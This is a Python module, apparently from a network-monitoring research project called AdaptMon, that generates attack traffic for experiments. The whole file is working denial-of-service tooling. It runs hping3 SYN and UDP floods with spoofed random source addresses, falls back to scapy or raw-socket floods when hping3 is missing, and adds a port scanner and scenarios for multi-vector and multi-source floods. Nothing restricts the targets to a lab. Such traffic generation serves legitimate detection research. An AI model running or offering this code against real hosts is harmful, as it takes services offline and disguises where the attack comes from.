"""
traffic/attack.py
Attack traffic simulation for AdaptMon experiments.
Implements SYN flood using hping3 and UDP flood.
"""

import subprocess
import threading
import time
import random
import logging
import os
import signal
from typing import List, Dict, Optional, Tuple

logger = logging.getLogger(__name__)

HPING3_BIN = os.environ.get("HPING3_BIN", "hping3")


class SynFloodAttack:
    """
    SYN flood attack using hping3.
    Sends TCP SYN packets with randomized source IPs.
    """

    def __init__(
        self,
        target_ip    : str,
        target_port  : int  = 80,
        rate         : int  = 1000,    # packets/sec
        duration     : int  = 30,
        rand_source  : bool = True,
        namespace    : str  = None,
    ):
        self.target_ip   = target_ip
        self.target_port = target_port
        self.rate        = rate
        self.duration    = duration
        self.rand_source = rand_source
        self.namespace   = namespace
        self._proc       : Optional[subprocess.Popen] = None
        self._log        = f"/tmp/hping3_{target_ip}_{target_port}.log"

    def start(self) -> bool:
        """Start the SYN flood attack."""
        cmd = [
            HPING3_BIN,
            "-S",                       # SYN flag
            "--flood",
            "-p", str(self.target_port),
            "--count", str(self.rate * self.duration),
        ]

        if self.rand_source:
            cmd += ["--rand-source"]

        cmd.append(self.target_ip)

        if self.namespace:
            cmd = ["ip", "netns", "exec", self.namespace] + cmd

        logger.info(
            f"SYN flood starting: target={self.target_ip}:{self.target_port} "
            f"rate={self.rate}pps duration={self.duration}s"
        )

        try:
            with open(self._log, "w") as lf:
                self._proc = subprocess.Popen(
                    cmd, stdout=lf, stderr=lf,
                    preexec_fn=os.setsid
                )
            return True
        except FileNotFoundError:
            logger.warning(
                "hping3 not found — falling back to scapy-based SYN flood"
            )
            return self._start_scapy_fallback()
        except Exception as e:
            logger.error(f"SYN flood failed to start: {e}")
            return False

    def _start_scapy_fallback(self) -> bool:
        """Fall back to Python-based SYN flood if hping3 unavailable."""
        def _flood():
            try:
                from scapy.all import IP, TCP, send, RandIP
                end_time = time.time() + self.duration
                while time.time() < end_time:
                    src_ip = str(RandIP()) if self.rand_source else "10.0.1.100"
                    pkt = IP(src=src_ip, dst=self.target_ip) / \
                          TCP(sport=random.randint(1024, 65535),
                              dport=self.target_port,
                              flags="S")
                    send(pkt, verbose=False, inter=1.0/self.rate)
            except ImportError:
                logger.error("scapy not available for SYN flood fallback")
            except Exception as e:
                logger.error(f"Scapy flood error: {e}")

        t = threading.Thread(target=_flood, daemon=True)
        t.start()
        return True

    def stop(self) -> None:
        """Stop the attack."""
        if self._proc and self._proc.poll() is None:
            try:
                os.killpg(os.getpgid(self._proc.pid), signal.SIGTERM)
                self._proc.wait(timeout=5)
            except Exception as e:
                logger.warning(f"Could not stop hping3: {e}")
                try:
                    self._proc.kill()
                except Exception:
                    pass
        self._proc = None
        logger.info(f"SYN flood stopped: {self.target_ip}:{self.target_port}")

    def wait(self) -> None:
        if self._proc:
            try:
                self._proc.wait(timeout=self.duration + 10)
            except subprocess.TimeoutExpired:
                self.stop()

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None


class UdpFloodAttack:
    """UDP flood attack targeting a specific host/port."""

    def __init__(
        self,
        target_ip   : str,
        target_port : int  = 53,
        rate        : int  = 2000,
        duration    : int  = 30,
        payload_size: int  = 64,
        namespace   : str  = None,
    ):
        self.target_ip    = target_ip
        self.target_port  = target_port
        self.rate         = rate
        self.duration     = duration
        self.payload_size = payload_size
        self.namespace    = namespace
        self._proc        : Optional[subprocess.Popen] = None
        self._thread      : Optional[threading.Thread] = None

    def start(self) -> bool:
        """Start UDP flood using hping3."""
        cmd = [
            HPING3_BIN,
            "--udp",
            "--flood",
            "-p", str(self.target_port),
            "--count", str(self.rate * self.duration),
            "--rand-source",
            "-d", str(self.payload_size),
            self.target_ip,
        ]

        if self.namespace:
            cmd = ["ip", "netns", "exec", self.namespace] + cmd

        logger.info(
            f"UDP flood starting: target={self.target_ip}:{self.target_port} "
            f"rate={self.rate}pps duration={self.duration}s"
        )

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            return True
        except FileNotFoundError:
            logger.warning("hping3 not found — using socket-based UDP flood")
            return self._start_socket_flood()
        except Exception as e:
            logger.error(f"UDP flood start failed: {e}")
            return False

    def _start_socket_flood(self) -> bool:
        """Socket-based UDP flood fallback."""
        def _flood():
            import socket
            payload = b"X" * self.payload_size
            end_time = time.time() + self.duration
            interval = 1.0 / self.rate if self.rate > 0 else 0.001
            try:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM
                )
                while time.time() < end_time:
                    src_port = random.randint(1024, 65535)
                    sock.sendto(
                        payload,
                        (self.target_ip, self.target_port)
                    )
                    if interval > 0:
                        time.sleep(interval)
            except Exception as e:
                logger.debug(f"Socket flood: {e}")
            finally:
                sock.close()

        self._thread = threading.Thread(target=_flood, daemon=True)
        self._thread.start()
        return True

    def stop(self) -> None:
        if self._proc and self._proc.poll() is None:
            try:
                os.killpg(os.getpgid(self._proc.pid), signal.SIGTERM)
            except Exception:
                pass
        self._proc = None

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None


class PortScanAttack:
    """
    Port scan simulation using hping3.
    Scans a range of ports on the target.
    """

    def __init__(
        self,
        target_ip   : str,
        start_port  : int  = 1,
        end_port    : int  = 1024,
        rate        : int  = 500,
        namespace   : str  = None,
    ):
        self.target_ip  = target_ip
        self.start_port = start_port
        self.end_port   = end_port
        self.rate       = rate
        self.namespace  = namespace
        self._proc      : Optional[subprocess.Popen] = None

    def start(self) -> bool:
        cmd = [
            HPING3_BIN,
            "-S",
            "--scan", f"{self.start_port}-{self.end_port}",
            "--faster",
            self.target_ip,
        ]

        if self.namespace:
            cmd = ["ip", "netns", "exec", self.namespace] + cmd

        logger.info(
            f"Port scan starting: target={self.target_ip} "
            f"ports={self.start_port}-{self.end_port}"
        )

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            return True
        except Exception as e:
            logger.error(f"Port scan failed: {e}")
            return False

    def stop(self) -> None:
        if self._proc and self._proc.poll() is None:
            try:
                os.killpg(os.getpgid(self._proc.pid), signal.SIGTERM)
            except Exception:
                pass


class AttackScenario:
    """
    Orchestrates a complete attack scenario with multiple attack types.
    """

    def __init__(
        self,
        normal_hosts  : List[str],
        target_hosts  : List[str],
        log_dir       : str = "/tmp/adaptmon_attacks",
    ):
        self.normal_hosts = normal_hosts
        self.target_hosts = target_hosts
        self.log_dir      = log_dir
        self._attacks     : List = []
        self._running     = False
        os.makedirs(log_dir, exist_ok=True)

    def run_scenario_1_syn_flood(
        self,
        duration : int = 60,
        rate     : int = 5000,
    ) -> None:
        """Scenario 1: Concentrated SYN flood against one target."""
        target = self.target_hosts[0]
        attack = SynFloodAttack(
            target_ip   = target,
            target_port = 80,
            rate        = rate,
            duration    = duration,
            rand_source = True,
        )
        self._attacks.append(attack)
        attack.start()
        logger.info(
            f"[Scenario 1] SYN flood -> {target} "
            f"rate={rate}pps duration={duration}s"
        )

    def run_scenario_2_multi_vector(
        self,
        duration : int = 60,
    ) -> None:
        """Scenario 2: Multi-vector attack — SYN + UDP flood."""
        for target in self.target_hosts[:2]:
            syn = SynFloodAttack(
                target_ip   = target,
                target_port = random.randint(80, 443),
                rate        = 2000,
                duration    = duration,
                rand_source = True,
            )
            udp = UdpFloodAttack(
                target_ip   = target,
                target_port = 53,
                rate        = 1000,
                duration    = duration,
            )
            self._attacks.extend([syn, udp])
            syn.start()
            time.sleep(0.5)
            udp.start()

        logger.info(
            f"[Scenario 2] Multi-vector attack -> "
            f"{self.target_hosts[:2]} duration={duration}s"
        )

    def run_scenario_3_distributed(
        self,
        duration : int = 60,
        n_sources: int = 4,
    ) -> None:
        """Scenario 3: Distributed SYN flood from multiple sources."""
        target = self.target_hosts[0]
        for i in range(n_sources):
            attack = SynFloodAttack(
                target_ip   = target,
                target_port = 80,
                rate        = 500,
                duration    = duration,
                rand_source = True,
            )
            self._attacks.append(attack)
            attack.start()
            time.sleep(0.2)

        logger.info(
            f"[Scenario 3] Distributed SYN flood: "
            f"{n_sources} sources -> {target}"
        )

    def stop_all(self) -> None:
        """Stop all running attacks."""
        for attack in self._attacks:
            try:
                attack.stop()
            except Exception as e:
                logger.warning(f"Error stopping attack: {e}")
        self._attacks.clear()
        logger.info("All attacks stopped")


def run_attack_sequence(
    target_ip    : str,
    duration     : int   = 120,
    attack_start : float = 30.0,
    attack_dur   : int   = 60,
    rate         : int   = 5000,
    scenario     : str   = "syn_flood",
) -> None:
    """
    Run an attack sequence after a delay.
    Intended to be called in a background thread.

    Args:
        target_ip    : Target IP address
        duration     : Total experiment duration
        attack_start : Seconds after start to begin attack
        attack_dur   : Duration of attack in seconds
        rate         : Attack rate (packets/sec)
        scenario     : Attack type: 'syn_flood', 'udp_flood', 'multi'
    """
    logger.info(
        f"Attack sequence scheduled: start in {attack_start}s, "
        f"duration={attack_dur}s, scenario={scenario}"
    )
    time.sleep(attack_start)

    logger.info(f"ATTACK STARTING: {scenario} -> {target_ip}")

    attacks = []

    if scenario == "syn_flood":
        a = SynFloodAttack(
            target_ip   = target_ip,
            target_port = 80,
            rate        = rate,
            duration    = attack_dur,
            rand_source = True,
        )
        a.start()
        attacks.append(a)

    elif scenario == "udp_flood":
        a = UdpFloodAttack(
            target_ip   = target_ip,
            target_port = 53,
            rate        = rate,
            duration    = attack_dur,
        )
        a.start()
        attacks.append(a)

    elif scenario == "multi":
        a1 = SynFloodAttack(
            target_ip   = target_ip,
            target_port = 80,
            rate        = rate // 2,
            duration    = attack_dur,
            rand_source = True,
        )
        a2 = UdpFloodAttack(
            target_ip   = target_ip,
            target_port = 53,
            rate        = rate // 2,
            duration    = attack_dur,
        )
        a1.start()
        a2.start()
        attacks.extend([a1, a2])

    # Wait for attack to complete
    time.sleep(attack_dur)

    for a in attacks:
        a.stop()

    logger.info(f"ATTACK FINISHED: {scenario} -> {target_ip}")
